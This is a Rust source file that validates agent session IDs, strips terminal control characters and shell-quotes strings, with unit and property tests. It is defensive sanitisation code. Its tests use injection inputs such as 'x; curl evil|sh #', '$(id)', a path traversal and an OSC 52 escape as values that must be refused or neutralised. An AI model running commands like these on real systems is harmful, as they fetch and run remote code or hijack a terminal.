// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 ORASCOPE Co.,Ltd. (https://www.orascope.net)

//! Checks for the text a record takes from outside the tower.
//!
//! A hook's payload is whatever the process that ran the hook binary wrote to
//! its stdin — normally the agent CLI, but anything that can run
//! `herdr-tower hook` with the right environment can write it too, including an
//! agent that was talked into it. So the fields that later reach a shell or a
//! terminal are held to what they are *for* rather than trusted: a session ID
//! is typed into a shell by `resume`, and a task or a question is printed
//! straight to a terminal by `status`.
//!
//! One place, because the checks are only worth anything if every writer and
//! every reader agrees on them — a hook that accepts what `resume` would refuse
//! stores a row that can never be revived, and a second copy of the charset is a
//! second place to forget a character.

use std::borrow::Cow;

/// The longest session ID a record keeps.
///
/// Every CLI's ID fits with room to spare — a UUID is 36 characters, an
/// opencode `ses_…` ID about 30 — so the bound only ever turns away a payload
/// that is not an ID at all.
pub const MAX_SESSION_ID: usize = 128;

/// Whether `id` can be a session ID: non-empty, at most [`MAX_SESSION_ID`]
/// characters, every one of them in `[A-Za-z0-9._:-]`.
///
/// The charset is the union of what the CLIs actually hand out (UUIDs, `ses_…`,
/// hex task IDs) and nothing a shell gives meaning to: no space, quote, `;`,
/// `$`, `|`, backtick or slash. That last one matters beyond the shell — the
/// gemini lookup joins the ID onto a directory, and `../` must not walk out of
/// it.
///
/// A leading `-` is refused as well: typed after `--resume`, it would be read
/// as the next option rather than as the ID.
pub fn valid_session_id(id: &str) -> bool {
    !id.is_empty()
        && id.len() <= MAX_SESSION_ID
        && !id.starts_with('-')
        && id
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b':' | b'-'))
}

/// `s` with its control characters taken out, fit to print to a terminal.
///
/// C0 (below U+0020), DEL and C1 (U+0080–U+009F) are what a terminal reads as
/// commands rather than text: an ESC or a bare C1 CSI/OSC introducer in a
/// question can retitle the window, write the clipboard through OSC 52, or move
/// the cursor to spoof a line of `herdr-tower status`. Tab, newline and carriage
/// return become a space rather than vanishing, so two words on either side of
/// one stay two words; everything else in those ranges is dropped.
///
/// Borrowed when there is nothing to remove, which is nearly always — this runs
/// on every save a hook makes and on every cell of the status table.
pub fn clean_text(s: &str) -> Cow<'_, str> {
    if !s.chars().any(is_control) {
        return Cow::Borrowed(s);
    }
    Cow::Owned(
        s.chars()
            .filter_map(|c| match c {
                '\t' | '\n' | '\r' => Some(' '),
                c if is_control(c) => None,
                c => Some(c),
            })
            .collect(),
    )
}

fn is_control(c: char) -> bool {
    matches!(c, '\u{0}'..='\u{1f}' | '\u{7f}'..='\u{9f}')
}

/// `s` as one word for a POSIX shell, always single-quoted.
///
/// Always rather than only when needed, so a command line has one shape to
/// read back: a checker that recognises `'…'` recognises every quoted word,
/// instead of having to guess which strings happened to need it. Inside single
/// quotes nothing is special except the quote itself, which is closed, escaped
/// and reopened: `it's` becomes `'it'\''s'`.
pub fn sh_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', r"'\''"))
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Examples: the IDs the CLIs hand out are accepted, as they are.
    #[test]
    fn real_session_ids_are_valid() {
        for id in [
            "0199a3b4-5c6d-7e8f-9a0b-1c2d3e4f5a6b",
            "ses_3f2a1b0c9d8eFfGgHh",
            "a1b2c3d4e5f607182",
            "conv.1:2_3",
            "x",
        ] {
            assert!(valid_session_id(id), "{id}");
        }
    }

    /// Edges: an injection, the empty ID, one character over the bound, a path
    /// and a leading dash are all refused; the bound itself is not.
    #[test]
    fn anything_a_shell_or_a_path_would_read_is_refused() {
        for id in [
            "x; curl evil|sh #",
            "",
            "$(id)",
            "`id`",
            "a b",
            "it's",
            "../../etc",
            "a/b",
            "--help",
            "-x",
            "id\n",
            "세션",
        ] {
            assert!(!valid_session_id(id), "{id:?}");
        }
        assert!(valid_session_id(&"a".repeat(MAX_SESSION_ID)));
        assert!(!valid_session_id(&"a".repeat(MAX_SESSION_ID + 1)));
    }

    /// Examples: ESC, OSC 52 and the C1 introducers are gone, whitespace
    /// controls are spaces, and text outside those ranges — Korean included —
    /// is kept.
    #[test]
    fn control_characters_are_removed_and_whitespace_becomes_a_space() {
        assert_eq!(clean_text("\x1b]52;c;ZXZpbA==\x07ok"), "]52;c;ZXZpbA==ok");
        assert_eq!(clean_text("a\tb\nc\rd"), "a b c d");
        assert_eq!(clean_text("\u{9b}31mred\u{9d}0;t\u{7f}"), "31mred0;t");
        assert_eq!(clean_text("승인할까요?"), "승인할까요?");
        assert!(matches!(clean_text("plain"), Cow::Borrowed("plain")));
    }

    /// Property: the output never holds a control character, and cleaning is
    /// idempotent.
    #[test]
    fn cleaned_text_holds_no_control_character() {
        let all: String = (0u32..0x200).filter_map(char::from_u32).collect();
        let once = clean_text(&all).into_owned();
        assert!(!once.chars().any(is_control), "{once:?}");
        assert_eq!(clean_text(&once), once);
    }

    /// Examples, and the property that `sh` reads each quoted word back as the
    /// string it came from.
    #[cfg(unix)]
    #[test]
    fn a_quoted_word_is_read_back_by_sh_as_itself() {
        assert_eq!(sh_quote("abc"), "'abc'");
        assert_eq!(sh_quote("/a b/it's"), r"'/a b/it'\''s'");
        for s in ["x; curl evil|sh #", "it's", "$(id) `id` \\ \"", "", "a\nb"] {
            let out = std::process::Command::new("sh")
                .arg("-c")
                .arg(format!("printf %s {}", sh_quote(s)))
                .output()
                .unwrap();
            assert_eq!(String::from_utf8(out.stdout).unwrap(), s);
        }
    }

    /// Characters the generated tests below draw from: every ASCII byte, the
    /// C1 range, and multi-byte text (Korean, an emoji, a combining accent, a
    /// fullwidth quote).
    fn any_char(rng: &mut tower_testrng::Rng) -> char {
        const WIDE: &[char] = &[
            '세', '션', '😀', '\u{301}', '\u{FF07}', 'é', '\u{2028}', '\u{FEFF}',
        ];
        match rng.below(4) {
            0 => char::from_u32(0x80 + rng.below(0x20) as u32).unwrap(),
            1 => *rng.pick(WIDE).unwrap(),
            _ => char::from(rng.below(0x80) as u8),
        }
    }

    /// Cross-check: over generated strings — mostly charset characters with
    /// the odd outsider, at lengths around the bound — `valid_session_id`
    /// agrees with a naive reading of its documented rule.
    #[test]
    fn session_ids_agree_with_a_naive_charset_check() {
        const CHARSET: &str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._:-";
        fn naive(id: &str) -> bool {
            let n = id.chars().count();
            (1..=128).contains(&n)
                && !id.starts_with('-')
                && id.chars().all(|c| CHARSET.contains(c))
        }
        let charset: Vec<char> = CHARSET.chars().collect();
        let mut rng = tower_testrng::Rng::new(0x05E5_510D);
        let (mut yes, mut no) = (0, 0);
        for round in 0..3000 {
            let len = match round % 4 {
                0 => rng.below(6),
                1 => 126 + rng.below(5),
                _ => rng.below(140),
            };
            let id: String = (0..len)
                .map(|_| {
                    if rng.one_in(60) {
                        any_char(&mut rng)
                    } else {
                        *rng.pick(&charset).unwrap()
                    }
                })
                .collect();
            let got = valid_session_id(&id);
            assert_eq!(got, naive(&id), "{id:?}");
            if got {
                yes += 1
            } else {
                no += 1
            }
        }
        assert!(yes > 300 && no > 300, "{yes} / {no}");
    }

    /// Edges at the bound: exactly 128 and 129 characters with a mixed
    /// charset, and a multi-byte character that would fit by count but is
    /// refused by charset (and would not fit by bytes).
    #[test]
    fn the_bound_is_exact_for_every_charset_character() {
        let base: String = "aZ9._:-".chars().cycle().take(MAX_SESSION_ID).collect();
        assert!(valid_session_id(&base));
        assert!(!valid_session_id(&format!("{base}x")));
        assert!(valid_session_id(&base[1..]));
        let wide = format!("{}é", "a".repeat(MAX_SESSION_ID - 2));
        assert!(!valid_session_id(&wide));
        for c in ['.', '_', ':', '0'] {
            assert!(valid_session_id(&c.to_string()), "{c}");
        }
        assert!(!valid_session_id("-"));
    }

    /// Properties over generated strings: the output holds no control
    /// character (cross-checked against std's `char::is_control`, which is
    /// the same Cc category), cleaning twice is cleaning once, every
    /// non-control character survives in order, whitespace controls become
    /// exactly one space each, and the result borrows exactly when there was
    /// nothing to remove.
    #[test]
    fn clean_text_properties_over_generated_strings() {
        let mut rng = tower_testrng::Rng::new(0x00C1_EA17);
        for _ in 0..2000 {
            let s: String = (0..rng.below(40)).map(|_| any_char(&mut rng)).collect();
            let once = clean_text(&s);
            assert!(!once.chars().any(char::is_control), "{s:?} -> {once:?}");
            assert_eq!(clean_text(&once), once, "idempotent for {s:?}");
            let naive: String = s
                .chars()
                .filter_map(|c| match c {
                    '\t' | '\n' | '\r' => Some(' '),
                    c if c.is_control() => None,
                    c => Some(c),
                })
                .collect();
            assert_eq!(once, naive, "{s:?}");
            assert_eq!(
                matches!(once, Cow::Borrowed(_)),
                !s.chars().any(char::is_control),
                "{s:?}"
            );
        }
        assert_eq!(clean_text(""), "");
        assert!(matches!(clean_text(""), Cow::Borrowed("")));
    }

    /// Round trip through a real `/bin/sh`: generated strings heavy in
    /// quotes, backslashes, `$`, backticks, `!`, `%`, newlines and unicode —
    /// every one comes back from `printf` exactly as it went in. The strings go
    /// through one shell run, NUL-separated, to keep the test fast.
    #[cfg(unix)]
    #[test]
    fn generated_strings_round_trip_through_a_real_sh() {
        const HOT: &[char] = &[
            '\'', '"', '\\', '$', '`', '!', '%', '\n', '\r', '\t', ' ', ';', '|', '&', '*', '?',
            '~', '#', '(', ')', '{', '}', '<', '>', '세', '😀', '\u{301}', '\u{FF07}', '\u{7f}',
            '\u{1b}',
        ];
        let mut rng = tower_testrng::Rng::new(0x0054_A07E);
        let mut words: Vec<String> = vec![String::new(), "'".into(), "''''".into(), "'\\''".into()];
        for _ in 0..300 {
            let len = rng.below(24);
            words.push(
                (0..len)
                    .map(|_| {
                        if rng.one_in(3) {
                            char::from(b'a' + rng.below(26) as u8)
                        } else {
                            *rng.pick(HOT).unwrap()
                        }
                    })
                    .collect(),
            );
        }
        let script = words
            .iter()
            .map(|w| {
                let q = sh_quote(w);
                assert!(q.starts_with('\'') && q.ends_with('\''), "{q}");
                format!("printf '%s\\0' {q}")
            })
            .collect::<Vec<_>>()
            .join("\n");
        let out = std::process::Command::new("/bin/sh")
            .arg("-c")
            .arg(script)
            .output()
            .unwrap();
        assert!(out.status.success(), "{:?}", out.stderr);
        let back: Vec<&str> = std::str::from_utf8(&out.stdout)
            .unwrap()
            .split('\0')
            .collect();
        assert_eq!(back.len(), words.len() + 1, "one NUL per word");
        for (w, b) in words.iter().zip(&back) {
            assert_eq!(w, b);
        }
    }
}
